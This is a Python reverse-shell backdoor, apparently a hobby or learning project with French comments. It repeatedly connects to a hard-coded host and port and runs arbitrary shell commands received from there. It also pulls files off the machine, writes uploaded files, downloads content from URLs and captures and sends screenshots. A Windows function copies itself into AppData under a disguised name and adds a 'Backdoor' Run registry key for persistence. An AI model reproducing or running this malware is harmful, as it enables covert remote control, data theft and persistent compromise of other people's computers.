#!/usr/bin/python3

import socket
import subprocess
import json
import os
import sys
import time
import requests
from mss.linux import MSS as mss

def reliable_send_image(data):
    sock.send(data)

def reliable_recv_image():
    while True:
        data = b""
        try:
            data_recv = sock.recv(1024)
            data = b"".join([data, data_recv])
            return data
        except ValueError:
            continue
    

def reliable_send(data):
    print("data {}, type {}, compare {}".format(data, type(data), type(data) is not bytes))
    if type(data) is not bytes:
        json_data = json.dumps(data)
    else:
        json_data = json.dumps(data.decode('utf-8'))
    json_data = json_data.encode()
    print("json_data -> {} ".format(json_data))
    sock.send(json_data)


def reliable_recv():
    data = ""
    while True:
        try:
            data_recv = sock.recv(1024).decode('utf-8')
            data = data + data_recv
            return json.loads(data)
        except ValueError:
            continue

def downloadFileFromTargetComputer(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_response.content)

def screenshot():
    # for others
    #with mss() as screenshot:
    #for linux
    with mss(display=":0.0") as screenshot:
        print(screenshot)
        screenshot.shot(output="monitor-1.png")
        #monitor_1 = screenshot.monitors[1]
        #screenshot = screenshot.grab(monitor_1)
        

def connection():
    # ajout d'une tentative de connexion toute les 20 secondes au serveur
    while True:
        time.sleep(20)
        try:
            sock.connect(("192.168.0.45", 54321))
            shell()
        except:
            connection()
def shell():
    while True:
        command = reliable_recv()
        print("command -> {}".format(command))
        if command == 'q':
            sock.close()
            break
        # on teste si la commande c'est cd donc qu'on change de directory
        # si je fais pas ça le programme plante quand on change de directory
        elif len(command) > 1 and command[:2] == "cd":
            print("je rentre dans le cd")
            try:
                # on met que un espace apres le cd
                os.chdir(command[3:])
            except:
                continue
        elif len(command) > 1 and command[:8] == "download":
            print("je rentre bien dans download")
            #try:
            with open(command[9:], "rb") as file:
                reliable_send(file.read())
            #except:
            #    reliable_send("Failed to Download")
        elif len(command) > 1 and command[:6] == "upload":
            print("je suis dans upload")
            file_data = command.split(" | ")
            file_name = command[7:len(file_data[0])]
            with open(command[7:len(file_data[0])], "wb") as file:
                print("file_data -> {}".format(file_data[1]))
                print("file_name -> {}".format(file_name))
                file.write(file_data[1].encode())
        elif len(command) > 1 and command[:3] == "get":
            try:
                downloadFileFromTargetComputer(command[4:])
                reliable_send("[+] Downloaded File From Specified URL!")
            except:
                reliable_send("[-] Faile to Downloade File From Specified URL!")
        elif len(command) > 1 and command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as screen:
                    reliable_send_image(screen.read())
                #maintenant on supprime le fichier pour pas qu'il apparaisse
                #os.remove("monitor-1.png")

            except Exception as error:
                print(error)
                reliable_send("[-] We can't take the picture")

        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result.decode('utf-8'))

def createBackdoorOnWindowsMachine():
    # on cree le path du fichier pour qu'il soit cacher
    location = os.environ["appdata"] + "\\windows32.exe"
    if not os.path.exists(location):
        #on copie le fichier dans un le dossier location pourqu'il soit imreperable, meme si l'autre est supprimer celui-ci restera
        shutil.copyfile(sys.executable, location)
        # on appelle une commande de l'invite de command windows
        # cette commande permet d'ajouter au registry de demarrage windows pour les logiciels 32 bits
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if __name__ == '__main__':
    connection()

